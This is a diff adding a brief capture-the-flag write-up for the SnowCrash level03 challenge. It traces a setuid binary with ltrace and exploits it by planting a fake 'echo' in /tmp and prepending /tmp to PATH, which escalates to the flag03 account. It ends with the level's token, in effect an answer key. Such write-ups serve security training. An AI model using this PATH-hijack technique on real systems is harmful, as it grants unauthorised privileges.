@@ -1,0 +1,32 @@
+In this level we have ELF file.
+
+We can analize with ltrace for understand whate he does
+
+level03@SnowCrash:~$ ltrace ./level03
+__libc_start_main(0x80484a4, 1, 0xbffff7e4, 0x8048510, 0x8048580 <unfinished ...>
+getegid()                                                               = 2003
+geteuid()                                                               = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                     = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                     = 0
+system("/usr/bin/env echo Exploit me"Exploit me
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                  = 0
++++ exited (status 0) +++
+
+We see he call /usr/bin/env to call echo, we can exploit this.
+Let's create a custom echo.
+
+echo "getflag" > /tmp/echo
+chmod +x /tmp/echo
+
+Put the new path of custom echo,
+export PATH=/tmp:$PATH
+
+level03@SnowCrash:~$ ls -la level03 
+-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+
+This file execut with flag03 perm, run it
+
+level03@SnowCrash:~$ ./level03 
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
